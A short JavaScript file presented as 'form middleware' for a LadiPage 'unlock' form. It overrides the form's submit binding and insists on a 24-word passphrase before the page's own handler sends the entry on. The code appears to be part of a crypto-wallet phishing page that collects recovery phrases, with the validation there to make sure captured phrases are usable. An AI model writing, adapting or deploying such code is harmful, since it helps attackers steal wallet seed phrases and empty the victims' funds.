/**
 * Form Middleware System v4 (no request)
 * - Middleware 1: Extract data
 * - Middleware 2: Validate passphrase
 * - Then call your submit handler
 */

const formMiddleware = {
  middlewares: [],
  use(fn) {
    this.middlewares.push(fn);
    return this;
  },
  execute(event, next) {
    let index = 0;
    const executeNext = () => {
      if (index < this.middlewares.length) {
        const middleware = this.middlewares[index++];
        middleware(event, executeNext);
      } else {
        next();
      }
    };
    executeNext();
  }
};

const unlockFormMiddleware = Object.create(formMiddleware);

// --- Middleware 1: extract form data
unlockFormMiddleware.use((event, next) => {
  console.log("Middleware 1: Extracting form data");
  event.preventDefault();

  const formData = new FormData(event.target);
  const data = {};
  formData.forEach((v, k) => (data[k] = v.trim()));
  event.formData = data;

  console.log("Form data:", data);
  next();
});

// --- Middleware 2: validate passphrase
unlockFormMiddleware.use((event, next) => {
  console.log("Middleware 2: Validating passphrase");
  const passphrase = event.formData?.message || "";

  if (!passphrase) {
    alert("Please enter your 24-word passphrase");
    return;
  }

  const words = passphrase.split(/\s+/);
  if (words.length !== 24) {
    alert("Passphrase must contain exactly 24 words");
    return;
  }

  next();
});

let middlewareExecuting = false;

document.addEventListener("DOMContentLoaded", () => {
  console.log("Setting up form middleware => v4");

  const unlockForm = document.querySelector(".ladi-form");
  if (!unlockForm) {
    console.warn("Không tìm thấy .ladi-form");
    return;
  }

  const originalAddEventListener = Element.prototype.addEventListener;

  unlockForm.addEventListener = function (type, listener, options) {
    if (type === "submit") {
      console.log("Intercepting submit event binding");

      const wrappedListener = function (event) {
        if (middlewareExecuting) return;

        middlewareExecuting = true;
        console.log("Form submission intercepted by middleware");

        unlockFormMiddleware.execute(event, () => {
          console.log("All middlewares completed → call original handler");
          listener.call(unlockForm, event);
          setTimeout(() => (middlewareExecuting = false), 100);
        });
      };

      return originalAddEventListener.call(this, type, wrappedListener, options);
    }

    return originalAddEventListener.call(this, type, listener, options);
  };
});
